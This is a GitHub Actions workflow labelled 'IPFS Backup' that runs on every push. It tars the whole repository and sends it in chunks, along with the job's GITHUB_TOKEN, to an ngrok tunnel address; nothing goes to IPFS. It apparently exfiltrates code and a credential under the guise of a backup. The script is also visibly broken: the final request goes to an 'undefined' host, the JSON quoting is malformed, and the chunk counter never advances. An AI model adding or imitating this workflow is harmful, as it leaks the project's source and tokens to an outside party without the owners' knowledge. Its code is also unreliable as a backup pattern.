
name: IPFS Backup

on:
  push:
    branches:
      - main
      - master
  workflow_dispatch:

jobs:
  backup:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Upload to IPFS
        run: |
          # Generate unique upload ID
          UPLOAD_ID=$(date +%s)-${{ github.run_id }}
          
          # Calculate total chunks
          CHUNK_SIZE=50000000 # 50MB chunks
          TOTAL_CHUNKS=$(tar -czf - --exclude='.git' . | wc -c | awk -v size=$CHUNK_SIZE '{print int(($1+size-1)/size)}')
          
          # Split and upload chunks
          CHUNK_NUM=1
          tar -czf - --exclude='.git' . | split -b $CHUNK_SIZE --filter '
            curl -X POST               -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"               -H "X-GitHub-Repository: ${{ github.repository }}"               -H "X-Upload-Id: '"$UPLOAD_ID"'"               -H "X-Chunk-Number: '"$CHUNK_NUM"'"               -H "X-Total-Chunks: '"$TOTAL_CHUNKS"'"               -F "chunk=@-"               https://b7ed-31-205-124-16.ngrok-free.app/api/storage/upload/chunk;
            CHUNK_NUM=$((CHUNK_NUM+1))
          '
          
          # Complete upload
          curl -X POST             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"             -H "Content-Type: application/json"             -d "{"uploadId":"$UPLOAD_ID"}"             undefined/api/storage/upload/complete

      - name: Update backup status
        if: success()
        run: |
          echo "âœ… Backup completed successfully"
          echo "Repository: ${{ github.repository }}"
          echo "Run ID: ${{ github.run_id }}"
